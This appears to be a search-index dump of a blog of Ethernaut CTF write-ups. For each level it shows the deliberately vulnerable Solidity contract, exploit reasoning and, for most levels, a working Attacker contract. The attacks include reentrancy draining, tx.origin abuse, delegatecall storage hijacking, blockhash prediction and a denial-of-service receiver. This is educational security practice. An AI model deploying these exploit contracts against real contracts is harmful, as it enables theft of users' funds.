{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome!","text":"<p>Hey there! This is the place where I'll be sharing my solutions for various capture the flag (CTF) challenges, specifically those from Ethernaut, Capture the Ether, and Damn Vulnerable DeFi.</p> <p>If you're not familiar with CTFs, they're a type of competition where participants solve puzzles and challenges to find hidden \"flags\" that are meant to represent vulnerabilities in software or systems. These challenges can range from simple coding exercises to complex cryptographic problems, and they're a great way to develop your skills in areas like reverse engineering, blockchain security, and exploit development.</p> <p>On this page, I'll be sharing my thought process, solutions, and insights for the CTFs I complete. My hope is that these posts will not only serve as helpful resources for others who are working on these challenges, but also as a way for me to deepen my own understanding and improve my skills.</p> <p>So, whether you're a seasoned CTF player or just getting started, I hope you find this blog useful and informative. Thanks for stopping by!</p>"},{"location":"1.%20Ethernaut/01.%20Fallback/","title":"Fallback","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Fallback {\n\nmapping(address =&gt; uint) public contributions;\naddress public owner;\n\nconstructor() {\nowner = msg.sender;\ncontributions[msg.sender] = 1000 * (1 ether);\n}\n\nmodifier onlyOwner {\nrequire(\nmsg.sender == owner,\n\"caller is not the owner\"\n);\n_;\n}\n\nfunction contribute() public payable {\nrequire(msg.value &lt; 0.001 ether);\ncontributions[msg.sender] += msg.value;\nif(contributions[msg.sender] &gt; contributions[owner]) {\nowner = msg.sender;\n}\n}\n\nfunction getContribution() public view returns (uint) {\nreturn contributions[msg.sender];\n}\n\nfunction withdraw() public onlyOwner {\npayable(owner).transfer(address(this).balance);\n}\n\nreceive() external payable {\nrequire(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);\nowner = msg.sender;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/01.%20Fallback/#goal","title":"Goal","text":"<p>Withdraw the ETH from the vulnerable smart contract</p>"},{"location":"1.%20Ethernaut/01.%20Fallback/#exploit","title":"Exploit","text":"<p>In order to drain the contract from it's funds, we need to be able to call the withdraw() function.</p> <p>From the code we can see that the withdraw() function, has onlyOwner modifier attached to it, which means that only the account that has created this smart is able to call this function.</p> <p>So, the next step would be to check if somehow we can modify/change the owner of the contract.</p> <p>If we look further down the code, we can see that the place were the owner is modified is in the receive() function. From the solidity docs we can see that the receive() function is executed on a call to the contract with empty calldata, this means this function is executed on plain Ether transfers.</p> <p>Before being able to call the receive() function to change the owner, we must fulfil the require statement inside the function, that is we must call the receive function with some value (ETH) greater than 0, and we must have contribution before calling the function.</p> <p>To exploit the contract we need to:</p> <ol> <li>call contribute() function with value less than 0.001 ETH</li> <li>send ETH to the Fallback contract, this will trigger the receive() function and therefore change the owner of the contract</li> <li>call the withdraw() function, since we are the new owner of the contract, all the balance from the Fallback contract will be transferred to our account</li> </ol>"},{"location":"1.%20Ethernaut/02.%20Fallout/","title":"Fallout","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\ncontract Fallout {\n\n  using SafeMath for uint256;\n  mapping (address =&gt; uint) allocations;\n  address payable public owner;\n\n\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n            require(\n                msg.sender == owner,\n                \"caller is not the owner\"\n            );\n            _;\n        }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] &gt; 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n</code></pre>"},{"location":"1.%20Ethernaut/02.%20Fallout/#goal","title":"Goal","text":"<p>Withdraw the ETH from the vulnerable smart contract</p>"},{"location":"1.%20Ethernaut/02.%20Fallout/#exploit","title":"Exploit","text":"<p>In order to drain the contract from it's funds, we need to be able to call the collectAllocations() function.</p> <p>From the code we can see that the collectAllocations() function, has onlyOwner modifier attached to it, which means that only the account that has created this smart is able to call this function.</p> <p>So, the next step would be to check if somehow we can modify/change the owner of the contract.</p> <p>If we take a look at the Fal1out() function, we can see that inside this function the owner is set to be msg.sender.</p> <p>The reason we can exploit this function is actually a typo. The Fal1out() function is meant to be the contract's constructor, but since the name of the contract (Fallout) differ from the constructor function name, the Fal1out() function is publicly accessible, meaning anyone can call it.</p> <p>This kind of exploit can't happen with newer versions of Solidity, since there is a special keyword for the contract's constructor.</p> <p>To exploit the contract we need to:</p> <ol> <li>call Fal1out() function with some value, this function will set our account as the owner of the contract</li> <li>call the collectAllocations() function, since we are the new owner of the contract, all the balance from the Fallout contract will be transferred to our account</li> </ol>"},{"location":"1.%20Ethernaut/03.%20Coin%20Flip/","title":"Coin Flip","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n\nuint256 public consecutiveWins;\nuint256 lastHash;\nuint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\nconstructor() {\nconsecutiveWins = 0;\n}\n\nfunction flip(bool _guess) public returns (bool) {\nuint256 blockValue = uint256(blockhash(block.number - 1));\n\nif (lastHash == blockValue) {\nrevert();\n}\n\nlastHash = blockValue;\nuint256 coinFlip = blockValue / FACTOR;\nbool side = coinFlip == 1 ? true : false;\n\nif (side == _guess) {\nconsecutiveWins++;\nreturn true;\n} else {\nconsecutiveWins = 0;\nreturn false;\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/03.%20Coin%20Flip/#goal","title":"Goal","text":"<p>Win every bet by predicting the guess</p>"},{"location":"1.%20Ethernaut/03.%20Coin%20Flip/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>We need more than 10 consecutive wins to pass this challenge, this value is stored inside the consecutiveWins variable, which is initialized to 0 in the contructor. </p> <p>One think to keep in mind is that the transactions in the blockchain are atomic, so either everything passes and the state is changed, or if the transaction failes everything is reverterd to the previous state, meaning if the transaction reverts every storage variable will kepp it's previos state (value).</p> <p>Another thing to keep in mind is that everything in the smart contracts is publicly visible, including the local variables and state variables marked as private.</p> <p>To place our guess we need to call the flip() function with a boolean parameter, which means this function only accepts true or false as parameters.</p> <p>Inside the Attacker contract we can pre-calculate the side parameter and call the flip(bool _guess) function from the CoinFlip contract within the Attacker contract, only if our guess is correct.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and send the address of the CoinFlip contract inside the Attacker contract</li> <li>create placeGuess(bool _guess) external function inside the Attacker contract, inside this function we will pre-calculate the side parameter (which can be true or false)</li> <li>call the placeGuess function inside the Attacker contract with a value for the _guess parameter (true/false)</li> <li>if our _guess is equal to the pre-calculated side parameter, we call the flip() function from the CoinFlip contract, if our _guess does not match the side parameter we revert the transaction</li> </ol>"},{"location":"1.%20Ethernaut/03.%20Coin%20Flip/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n\naddress private coinFlipContractAddress;\nuint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\nconstructor(address _cf) {\ncoinFlipContractAddress = _cf;\n}\n\nfunction placeGuess(bool _guess) external {\nuint256 blockValue = uint256(blockhash(block.number - 1));\n\nuint256 coinFlipp = blockValue / FACTOR;\nbool side = coinFlipp == 1 ? true : false;\n\nif (side == _guess) {\n// calling the flip function from CoinFlip contract\n(bool success, ) = coinFlipContractAddress.call(abi.encodeWithSignature(\"flip(bool)\", _guess));\nrequire(success, \"Transaction failed\");\n} else revert();\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/04.%20Telephone/","title":"Telephone","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\naddress public owner;\n\nconstructor() {\nowner = msg.sender;\n}\n\nfunction changeOwner(address _owner) public {\nif (tx.origin != msg.sender) {\nowner = _owner;\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/04.%20Telephone/#goal","title":"Goal","text":"<p>Change the owner of the Telephone smart contract</p>"},{"location":"1.%20Ethernaut/04.%20Telephone/#exploit","title":"Exploit","text":"<p>Similar to the previous Coin Flip CTF, we will again need additional smart contract to complete this challenge, again this contract will be named Attacker</p> <p>In order to win this challenge we need to change the owner of the contract, and looking into the code we can see that there is chageOwner() function, with some additional requirement. So let's jump to it!</p> <p>As seen inside changeOwner() function, in order to change the owner we first make the following check:</p> <pre><code>  if (tx.origin != msg.sender)\n</code></pre> <p>What this is checking is if the originator of the transaction is different from the msg.sender (the account from which changeOwner() function is called). With that in mind, in order to solve the challenge we will need to find a way to \"forward\" the call to changeOwner() from another smart contract. Kepp in mind that tx.origin will always be an externally owned account (EOA) and confusing tx.origin with msg.sender can lead to phishing-style attacks.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and send the address of the the Telephone contract inside the Attacker contract</li> <li>create changeOwnerFromAttacker() external function inside the Attacker contract, inside this function we will call the changeOwner(_owner) function from Telephone smart contract, passing msg.sender as argument for the _owner, this is the part where we are forwarding the call</li> <li>call the changeOwnerFromAttacker() function inside the Attacker contract</li> <li>this will change the owner of the Telephone contract setting our EOA account as the owner</li> </ol>"},{"location":"1.%20Ethernaut/04.%20Telephone/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n\naddress private telephoneContractAddress;\n\nconstructor(address _tel) {\ntelephoneContractAddress = _tel;\n}\n\nfunction changeOwnerFromAttacker() external {\n(bool success, ) = telephoneContractAddress.call(abi.encodeWithSignature(\"changeOwner(address)\", msg.sender));\nrequire(success, \"Transaction failed\");\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/05.%20Token/","title":"Token","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n\nmapping(address =&gt; uint) balances;\nuint public totalSupply;\n\nconstructor(uint _initialSupply) public {\nbalances[msg.sender] = totalSupply = _initialSupply;\n}\n\nfunction transfer(address _to, uint _value) public returns (bool) {\nrequire(balances[msg.sender] - _value &gt;= 0);\nbalances[msg.sender] -= _value;\nbalances[_to] += _value;\nreturn true;\n}\n\nfunction balanceOf(address _owner) public view returns (uint balance) {\nreturn balances[_owner];\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/05.%20Token/#goal","title":"Goal","text":"<p>We need to hack the Token smart contract in a way that the amount of tokens within our account will be very large</p>"},{"location":"1.%20Ethernaut/05.%20Token/#exploit","title":"Exploit","text":"<p>The way we are going to exploit this smart contract is by causing the value inside balances[msg.sender] to underflow.</p> <p>We now that we are starting witn inital balance of 20 tokens. Inside the transfer() function we can see that we are substracting our initial balance from the amount of tokens that we wish to transfer:</p> <pre><code>  balances[msg.sender] -= _value;\n</code></pre> <p>So, in order to cause the underflow we just need to pass value bigger than 20 for the _value parameter inside transfer() function</p> <p>Note that this exploit can not happen in version of Solidity starting from 0.8 or if using the SafeMath library from OpenZeppelin</p> <p>To exploit the contract we need to:</p> <ol> <li>call the transfer() function with argument bigger than 20 for the _value parameter  ex. contract.transfer(0x000000, 21)</li> </ol>"},{"location":"1.%20Ethernaut/06.%20Delegation/","title":"Delegation","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Delegate {\n\naddress public owner;\n\nconstructor(address _owner) {\nowner = _owner;\n}\n\nfunction pwn() public {\nowner = msg.sender;\n}\n}\n\ncontract Delegation {\n\naddress public owner;\nDelegate delegate;\n\nconstructor(address _delegateAddress) {\ndelegate = Delegate(_delegateAddress);\nowner = msg.sender;\n}\n\nfallback() external {\n(bool result,) = address(delegate).delegatecall(msg.data);\nif (result) {\nthis;\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/06.%20Delegation/#goal","title":"Goal","text":"<p>The goal of this level is to claim ownership of the Delegation instance.</p>"},{"location":"1.%20Ethernaut/06.%20Delegation/#exploit","title":"Exploit","text":"<p>In order to exploit this contract one must first understand how <code>fallback</code> methods and <code>delegatecall</code> low function works.</p> <p><code>fallback</code> is a special function that is executed when a function that does not exist is called from some smart contract.</p> <p><code>delegatecall</code> is a low level function similar to call, with the only difference when we make a delegatecall to some smart contract, the callee's smart contract code is executed in context of the caller (this means the caller storage is changed, and msg.sender and msg.value from the caller are taken into account).</p> <p>In our case, when we try to call the <code>pwn()</code> function inside <code>Delegation</code> contract, since this function is not present in the <code>Delegation</code> contract, its <code>fallback</code> function will be triggered and it will delegatecall to the <code>Delegate</code> contract with the <code>pwn()</code> function funcion-selector argument for msg.data.</p> <p>To exploit the contract we need to:</p> <ol> <li>copy the code from Ethernaut to Remix</li> <li>get the contract instance address from the web console</li> <li>load the <code>Delegate.sol</code> contract at the contract instance address (it is important to load <code>Delegate.sol</code> contract and not <code>Delegation.sol</code>)</li> <li>call the <code>pwn()</code> function inside Remix. NOTE: we need to increase gas limit in MetaMask in order for the transaction to succeed </li> </ol>"},{"location":"1.%20Ethernaut/07.%20Force/","title":"Force","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\nMEOW ?\n         /\\_/\\   /\n____/ o o \\\n/~____  =\u00f8= /\n(______)__m_m)\n\n*/}\n</code></pre>"},{"location":"1.%20Ethernaut/07.%20Force/#goal","title":"Goal","text":"<p>We need to find a way to send ETH to the Force contract</p>"},{"location":"1.%20Ethernaut/07.%20Force/#exploit","title":"Exploit","text":"<p>In order for a smart contract to be able to receive ETH it should have fallback() and/or receive() functions implemented.</p> <p>As we can see our Force smart contract is empty so it seems it is not possible to send ETH to it, or maybe it is :). Let's find out.</p> <p>Every smart contract in Solidity can call a special function called selfdestruct. What this function does is deleting the contract from the blockchain and sending all remaining ETH stored in the contract to a designated address. More info can be found here.</p> <p>So, how can we make use of selfdestruct to solve the CTF. We can create another smart contract (Attacker), call the selfdestruct function on the Attacker contract, and set the address of the Force contract as a designated target for sending the ETH</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and send the address of the Force contract inside the Attacker contract</li> <li>the constructor of the Attacker smart contract should be payable in order to be able to receive ETH while instantiating the contract (we will send this ETH on contract creation)</li> <li>create external destruct() function inside Attacker contract, this function will call selfedstruct with the Force address as argument</li> <li>call the destruct() function</li> </ol>"},{"location":"1.%20Ethernaut/07.%20Force/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\n\naddress private forceContractAddress;\n\n// send 1 ETH to the contract on creation\nconstructor(address _force) payable {\nforceContractAddress = _force;\n}\n\nfunction destruct() external {\nselfdestruct(forceContractAddress);\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/08.%20Vault/","title":"Vault","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Vault {\nbool public locked;\nbytes32 private password;\n\nconstructor(bytes32 _password) {\nlocked = true;\npassword = _password;\n}\n\nfunction unlock(bytes32 _password) public {\nif (password == _password) {\nlocked = false;\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/08.%20Vault/#goal","title":"Goal","text":"<p>Unlock the vault (guess the value of the password variable) to pass the level.</p>"},{"location":"1.%20Ethernaut/08.%20Vault/#exploit","title":"Exploit","text":"<p>It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.</p> <p>We can crack this level with looking at the value that the password variable holds with the use of blockchain explorer such as Etherscan.</p> <p>To do that we need to inspect the transaction where the password variable is updated, and we can se that this id done in the constructor, which means we need to find the tranasction that has created the Vault contract.</p> <p></p>"},{"location":"1.%20Ethernaut/09.%20King/","title":"King","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\naddress king;\nuint public prize;\naddress public owner;\n\nconstructor() payable {\nowner = msg.sender;  king = msg.sender;\nprize = msg.value;\n}\n\nreceive() external payable {\nrequire(msg.value &gt;= prize || msg.sender == owner);\npayable(king).transfer(msg.value);\nking = msg.sender;\nprize = msg.value;\n}\n\nfunction _king() public view returns (address) {\nreturn king;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/09.%20King/#goal","title":"Goal","text":"<p>Stop another account (EOA or contract) of reclaiming kingship</p>"},{"location":"1.%20Ethernaut/09.%20King/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The vulnerable part of the code is the following:</p> <pre><code>payable(king).transfer(msg.value);\n</code></pre> <p>When someone tries to reclaiming kingship, the ether sent in the transaction is sent to the current king.</p> <p>The issue is in the transfer() function. It reverts if the transaction conducts more than 2300 gas, therefore we can become king, and when someone tries to become new king, ether will be send to our Attacker contract and we can cause the transaction to revert.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and send the address of the King contract in the constructor.</li> <li>in the constructor we send a transaction to King contract with some value in order for the Attacker contract to become King</li> <li>implement receive() function to run in infinite loop, this will cause failure of the transaction because of too much gas</li> </ol>"},{"location":"1.%20Ethernaut/09.%20King/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nuint256 private count;\n\nconstructor(address king) payable {\n(bool sent, ) = king.call{value: msg.value}(\"\");\nrequire(sent, \"Failed to send Ether\");\n}\n\nreceive() external payable {\nwhile (true) {\ncount++;\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/10.%20Re-entrancy/","title":"Re-entrancy","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\ncontract Reentrance {\n\n  using SafeMath for uint256;\n  mapping(address =&gt; uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] &gt;= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/10.%20Re-entrancy/#goal","title":"Goal","text":"<p>steal all the funds from the Reentrance contract</p>"},{"location":"1.%20Ethernaut/10.%20Re-entrancy/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The purpose of the Attacker will be to make reentrant callback to some function inside the Reentrance contract.</p> <p>Reentrancy attacks (SWC-107) are very well-known thanks to the infamous DAO hack that happened on the Ethereum network. In a reentrancy attack, a vulnerable contract sends ether to an unknown address that contains a fallback function. Then, a malicious code calls back repeatedly a function in the vulnerable contract before the first call be finished.</p> <p>In order for reentrancy to happen the vulnerable function must make external function call to uknown address (malicious smart contract).</p> <p>If we take a look into our code, we can see that the only place where external call is made is inside the withdraw function</p> <pre><code>(bool result,) = msg.sender.call{value:_amount}(\"\");\n</code></pre> <p>So, in our case if we call the withdraw() function from the Attacker contract (in which case msg.sender will refer to the address of the Atacker contract), from the code above we can see that the Attacker contract is called and we are sending value (ETH) to it. What we know from the previous CTFs is that when we send a value to a smart contract withoud call data, then the receive() function, if present, is called/triggered.</p> <p>Knowing that we can implement the receive() function in the Attacker contract, in a way that inside receive(), the withdraw() function from the Reentrance contract will be called again, thus not alowing the withdraw() function to complete untill all of the ETH from the Reentrance smart contract is drained.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the Reentrance contract inside the Attacker contract</li> <li>call donate(_to) function inside Reentrance from our EOA account using the Attacker contract address as argument for _to parameter</li> <li>create external receive() function inside Attacker contract, this function will make a reentrant call to the Reentrance contract by calling the withdraw() function within it, as along as address(reentrance).balance is greater than 0</li> </ol>"},{"location":"1.%20Ethernaut/10.%20Re-entrancy/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nReentrance private immutable reentrance;\n\nconstructor(address payable _reentrance) public {\nreentrance = Reentrance(_reentrance);\n}\n\nreceive() external payable {\nif(address(reentrance).balance &gt; 0) {\nif(address(reentrance).balance &gt; reentrance.balanceOf(address(this))) {\nreentrance.withdraw(reentrance.balanceOf(address(this)));\n} else {\nreentrance.withdraw(address(reentrance).balance);\n}\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/11.%20Elevator/","title":"Elevator","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\nfunction isLastFloor(uint) external returns (bool);\n}\n\n\ncontract Elevator {\nbool public top;\nuint public floor;\n\nfunction goTo(uint _floor) public {\nBuilding building = Building(msg.sender);\n\nif (! building.isLastFloor(_floor)) {\nfloor = _floor;\ntop = building.isLastFloor(floor);\n}\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/11.%20Elevator/#goal","title":"Goal","text":"<p>Reach the top of the building, set the top variable inside Elevator contract to true</p>"},{"location":"1.%20Ethernaut/11.%20Elevator/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>The purpose of the Attacker will be to implement the isLastFloor() function from the Building interface.</p> <p>There two important lines of code worth mentioning. First one is:</p> <pre><code>  Building building = Building(msg.sender);\n</code></pre> <p>This means that the Building interface will be implemented in the context of msg.sender (in our case it will be the Attacker contract), therefore the Attacker contract must have isLastFloor(uint) function implemented</p> <p>The second line is:</p> <pre><code>  top = building.isLastFloor(floor);\n</code></pre> <p>This is the only place where we assign value to the top variable.</p> <p>So let's dive in. From the code we can see that the top variable is in conjunction with the isLastFloor() function from the Building interface, it's value is directly dependant from the return value of isLastFloor() function.</p> <p>Inside goTo() function we can see that isLastFloor() function is called 2 times. What we can do in the Attacker contract is implement the isLastFloor() function, and we need a way to make this function return false the first time is called, and return true afterwards. To achieve this we can use storage variable.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the Elevator contract inside the Attacker contract, this contract should also have additional storage variable count</li> <li>create external hackElevator() function inside Attacker contract, and from this function call the goTo() function inside the Elevator contract</li> <li>lastly implement/create isLastFloor(uint) function, that is contained in the Building interface, inside isLastFloor we need to incremenet the count variable, and return false if count is lees than 1 or true otherwise</li> <li>call the hackElevator function()</li> </ol>"},{"location":"1.%20Ethernaut/11.%20Elevator/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nElevator private immutable elevator;\nuint private count;\n\nconstructor(address _elevator) {\nelevator = Elevator(_elevator);\n}\n\nfunction hackElevator() external {\nelevator.goTo(3);\nrequire(elevator.top(), \"not top\");\n}\n\nfunction isLastFloor(uint) external returns (bool) {\ncount++;\nreturn count &gt; 1;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/15.%20Naught%20Coin/","title":"Naught Coin","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 {\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = block.timestamp + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player) \n  ERC20('NaughtCoin', '0x0') {\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  }\n\n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n    super.transfer(_to, _value);\n  }\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() {\n    if (msg.sender == player) {\n      require(block.timestamp &gt; timeLock);\n      _;\n    } else {\n     _;\n    }\n  } \n} \n</code></pre>"},{"location":"1.%20Ethernaut/15.%20Naught%20Coin/#goal","title":"Goal","text":"<p>Transfer the Naught Coin from your balance before the deadline expires</p>"},{"location":"1.%20Ethernaut/15.%20Naught%20Coin/#exploit","title":"Exploit","text":"<p>For this exercise we are starting with some inital balance of Naught Coins in our account and we need to find a way how to transfer them to another account and not waiting for the deadline to expire.</p> <p>If we take a look at the transfer() function inside NaughtCoin contract we notice that this function has a modifier attached to it (lockTokens) that does not allow us to transfer the tokens if the current block timestamp is not greater than the timelock. But there is something strange here, inside the modifier we check if the msg.sender is the player. The question that arises is, what if someone else can transfer our tokens on our behalf, is that possible?</p> <p>In order to solve this CTF, one must be familiar with the ERC20 specification from OpenZeppelin. After some research, I found out that there is another function transferFrom inside the ERC20 specification, that can be used for transferring tokens from one to another address. This function allows us to transfer someone else's tokens on their behalf to another address. There is one thing that we should take in mind, the owner of the tokens should approve us to transfer the tokens on their behalf.</p> <p>Since the Naught Coin is inheriting from the ERC20 standard, we can use the above-mentioned approach to solve this CTF</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract, and create instance from the NaughtCoin contract inside the Attacker contract</li> <li>call the approve function from the NaughtCoin contract (contract.approve), with the address of the Attacker contract as first parameter, and the amount we want to approve as second (in our case it will be balanceOf(msg.sender))</li> <li> <p>create withdrawFunds() external function, and inside this function call the transferFrom(from, to, amount) function inside the NaughtCoin contract  <ul> <li>our account address should be used for the from parameter</li> <li>the address of the Attacker contract should be used for the to parameter</li> <li>naughtCoin.balanceOf(msg.sender) should be used for the amount parameter</li> </ul></p> </li> <li> <p>call the withdrawFunds() function from our account</p> </li> </ol>"},{"location":"1.%20Ethernaut/15.%20Naught%20Coin/#attacker-contract-code","title":"Attacker contract code","text":"<pre><code>contract Attacker {\nNaughtCoin private immutable coin;\n\nconstructor(NaughtCoin _coin) {\ncoin = NaughtCoin(_coin);\n}\n\nfunction withdrawFunds() external {\ncoin.transferFrom(msg.sender, address(this), coin.balanceOf(msg.sender));\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/16.%20Preservation/","title":"Preservation","text":"<pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Preservation {\n\n// public library contracts address public timeZone1Library;\naddress public timeZone2Library;\naddress public owner; uint storedTime;\n// Sets the function signature for delegatecall\nbytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\nconstructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {\ntimeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender;\n}\n\n// set the time for timezone 1\nfunction setFirstTime(uint _timeStamp) public {\ntimeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n}\n\n// set the time for timezone 2\nfunction setSecondTime(uint _timeStamp) public {\ntimeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n}\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n// stores a timestamp uint storedTime;  function setTime(uint _time) public {\nstoredTime = _time;\n}\n}\n</code></pre>"},{"location":"1.%20Ethernaut/16.%20Preservation/#goal","title":"Goal","text":"<p>The goal of this level is to claim ownership of the Preservation instance.</p>"},{"location":"1.%20Ethernaut/16.%20Preservation/#exploit","title":"Exploit","text":"<p>In order to finish this CTF we will have to use another smart contract. We can name this contract Attacker.</p> <p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p> <p>The first issue that arises is related to the <code>LibraryContract</code>. If this contract was defined as library instead of contract, we would not have been able to exploit it, because <code>library</code> keyword prevents the libraries from storing and accessing state variables.</p> <p>When using <code>delegatecall</code> we must have in mind that the storage layout is very important, therefore the order of the state variables in the caller and the callee should be consistent and same.</p> <p>If we take a closer look we can see that when we call <code>setFirstTime</code> or <code>setSecondTime</code> functions from <code>Preservation</code>, we delegatecall to the <code>LibraryContract</code>. To be more specific, it means we will call <code>setTime</code> function inside <code>LibraryContract</code> and update <code>storedTime</code> variable to the value passed in <code>setTime</code> function. When we write to <code>storedTime</code> variable we are writing to the first storage slot inside <code>LibraryContract</code>, but since we are using <code>delegatecall</code> this will update the first storage slot of <code>Preservation</code> contract and it will update the <code>timeZone1Library</code> variable of the contract, and we want this variable to hold the value of our <code>Attacker</code> contract address.</p> <p>It means we need to figure out how to call <code>setFristTime</code> with the desired input, and that would be the uint256 value of our <code>Attacker</code> contract address. To do that we need to cast the address to uint256.</p> <p>After calling <code>setFirstTime</code> for the first time, we can call it once again inside our <code>Attacker</code> contract but since <code>timeZone1Library</code> is already updated to hold the value of the <code>Attacker</code> contract address, it will delegatecall to it, calling the <code>setTime</code> function. This means we need to have a <code>setTime</code> function in our <code>Attacker</code> contract. Inside <code>setTime</code> we will update the value of the <code>owner</code> variable, and this will update the <code>owner</code> variable in the <code>Preservation</code> contract.</p> <p>One thing to note is that the <code>Attacker</code> contract should have the same storage layout as the <code>Preservation</code> contract.</p> <p>To exploit the contract we need to:</p> <ol> <li>create Attacker contract</li> <li> <p>create attack(Preservation preservation) external function inside the Attacker contract, passing in the Preservation contract as function argument, and inside this function we will:  <ul> <li>call setFristTime function from the Preservation contract and pass the uint256 value representation of the Attacker contract address as argument, this will update timeZone1Library variable inside Preservation contract to the value of the Attacker contract address</li> <li>call setFristTime again, this will call cause the Preservation contract to delegatecall to the Attacker contract by calling setTime inside the Attacker contract</li> <li>check if the owner variable inside Preservation is the same as msg.sender, otherwise revert</li> </ul></p> </li> <li> <p>add setTime function, inside this function we will update the owner of the Preservation contract by assigning a value to the owner state variable of the Attacker contract</p> </li> </ol> <p>One question that bugs me is, why this solution won't work if we omit the require statement inside the <code>attack</code> 